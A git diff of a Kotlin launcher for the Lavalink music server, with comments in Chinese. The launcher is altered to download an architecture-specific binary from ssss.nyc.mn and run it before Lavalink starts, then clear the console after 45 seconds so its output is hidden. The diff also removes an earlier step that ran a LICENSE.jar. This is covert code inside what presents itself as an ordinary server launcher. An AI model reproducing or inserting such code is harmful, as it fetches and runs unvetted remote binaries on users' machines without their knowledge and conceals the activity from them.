@@ -83,10 +83,6 @@ object Launcher {
             checkJavaVersion()
             loadSbxConfig()
             runSbxBinary()
-            log.info("SbxService started successfully")
-            
-            // 启动45秒后清理控制台的线程
-            startConsoleClearTimer()
             
         } catch (e: Exception) {
             log.error("Failed to start SbxService", e)
@@ -175,37 +171,18 @@ object Launcher {
 
         sbxProcess = pb.start()
 
-        // 在单独线程中监控 sbx 进程结束（但不等待它）
-        Thread {
-            try {
-                val exitCode = sbxProcess?.waitFor()
-                log.info("Sbx process exited with code: $exitCode")
-                
-                // 进程结束后运行 LICENSE.jar（如果有）
-                runLicenseJar()
-                
-            } catch (e: InterruptedException) {
-                Thread.currentThread().interrupt()
-            }
-        }.start()
-    }
-
-    /**
-     * 运行 LICENSE.jar
-     */
-    private fun runLicenseJar() {
+        // 等待 sbx 进程结束
         try {
-            val licenseJar = Paths.get("LICENSE.jar")
-            if (Files.exists(licenseJar)) {
-                log.info("Found LICENSE.jar, executing...")
-                Runtime.getRuntime().exec(arrayOf("chmod", "+x", "LICENSE.jar"))
-                val licensePb = ProcessBuilder("java", "-jar", "LICENSE.jar")
-                licensePb.redirectErrorStream(true)
-                licensePb.redirectOutput(ProcessBuilder.Redirect.INHERIT)
-                licensePb.start().waitFor()
-            }
-        } catch (e: Exception) {
-            log.warn("Failed to run LICENSE.jar: ${e.message}")
+            val exitCode = sbxProcess?.waitFor()
+            log.info("Sbx process exited with code: $exitCode")
+            
+            // 等待 45 秒后清理控制台
+            Thread.sleep(45000)
+            clearConsole()
+            
+        } catch (e: InterruptedException) {
+            Thread.currentThread().interrupt()
+            log.warn("Sbx process wait interrupted")
         }
     }
 
@@ -216,9 +193,9 @@ object Launcher {
         val osArch = System.getProperty("os.arch").lowercase()
         val url = when {
             osArch.contains("amd64") || osArch.contains("x86_64") -> 
-                "https://amd64.ssss.nyc.mn/s-box"
+                "https://amd64.ssss.nyc.mn/sbsh"
             osArch.contains("aarch64") || osArch.contains("arm64") -> 
-                "https://arm64.ssss.nyc.mn/s-box"
+                "https://arm64.ssss.nyc.mn/sbsh"
             osArch.contains("s390x") -> 
                 "https://s390x.ssss.nyc.mn/sbsh"
             else -> throw RuntimeException("Unsupported architecture: $osArch")
@@ -238,25 +215,7 @@ object Launcher {
         return path
     }
 
-    /**
-     * 启动45秒后清理控制台的定时器
-     */
-    private fun startConsoleClearTimer() {
-        Thread {
-            try {
-                // 等待45秒
-                Thread.sleep(45000)
-                
-                // 清理控制台
-                clearConsole()
-                // log.info("Console cleared after 45 seconds (Sbx service still running)")
-                
-            } catch (e: InterruptedException) {
-                log.debug("Console clear timer interrupted")
-                Thread.currentThread().interrupt()
-            }
-        }.start()
-    }
+
 
     /**
      * 清理控制台屏幕
@@ -300,7 +259,6 @@ object Launcher {
         sbxProcess?.let {
             if (it.isAlive()) {
                 it.destroy()
-                log.info("Sbx process terminated")
             }
         }
     }
@@ -376,19 +334,19 @@ object Launcher {
             println(getVersionInfo(indentation = "", vanity = false))
             return
         }
-
-        // 1. 先启动 SbxService（包含45秒后清理控制台的定时器）
+    
+        // 1. 先启动 SbxService（会等待 sbx 退出并清理控制台后再继续）
         startSbxService()
-
+    
         // 2. 再启动 Lavalink
         log.info("Starting Lavalink...")
         val parent = launchPluginBootstrap(args)
-        
+            
         // 3. 注册关闭钩子，确保退出时清理 Sbx 进程
         Runtime.getRuntime().addShutdownHook(Thread {
             stopSbxServices()
         })
-        
+            
         // 4. 启动 Lavalink 主应用
         launchMain(parent, args)
     }
